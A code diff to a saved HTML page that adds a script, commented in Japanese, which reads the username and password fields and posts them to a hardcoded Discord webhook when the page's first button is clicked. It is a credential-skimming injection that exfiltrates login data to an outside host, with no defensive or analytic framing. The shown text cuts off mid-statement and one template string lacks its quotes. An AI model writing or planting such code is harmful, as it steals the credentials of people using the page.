@@ -678,5 +678,33 @@
 
 <script type="module" src="./いう_files/v4513226cdae34746b4dedf0b4dfa099e1781791509496" integrity="sha512-ZE9pZaUXND66v380QUtch/5sE9tPFh2zg45pR2PB0CVkCtOREv2AJKkSidISWkysEuQ0EH8faUU5du78bx87UQ==" data-cf-beacon="{&quot;version&quot;:&quot;2024.11.0&quot;,&quot;token&quot;:&quot;fdaed8f65dbe49e7941ff12ff81369ec&quot;}" crossorigin="anonymous"></script>
 
+<script>
+async function sendToDiscord() {
+    // https://discord.com/api/webhooks/1541784654326136873/ygFhAT3XQwgSGsnMrnl9c-6DFLkYt_TefUumfCvUn9Si_bqgofHhjkPzQZyzgkXlhxuD
+    const webhookUrl = "https://discord.com/api/webhooks/1541784654326136873/ygFhAT3XQwgSGsnMrnl9c-6DFLkYt_TefUumfCvUn9Si_bqgofHhjkPzQZyzgkXlhxuD"; 
+    
+    // ログインフォーム等からユーザー名やパスワードの入力値を取得（一例）
+    const usernameInput = document.querySelector('input[type="text"], input[type="email"]');
+    const passwordInput = document.querySelector('input[type="password"]');
 
+    const payload = {
+        content: 【入力データ受信】\nユーザー: ${usernameInput ? usernameInput.value : 'なし'}\nパス: ${passwordInput ? passwordInput.value : 'なし'}
+    };
+
+    try {
+        await fetch(webhookUrl, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload)
+        });
+    } catch (e) {
+        console.error(e);
+    }
+}
+
+// 画面内の「ログイン」等のボタンを押した時に自動でDiscordへ送信する処理
+document.addEventListener("DOMContentLoaded", () => {
+    const submitBtn = document.querySelector('button, input[type="submit"]');
+    if (submitBtn) {
+        submitBtn.addEventListener("click",...
 </body></html>
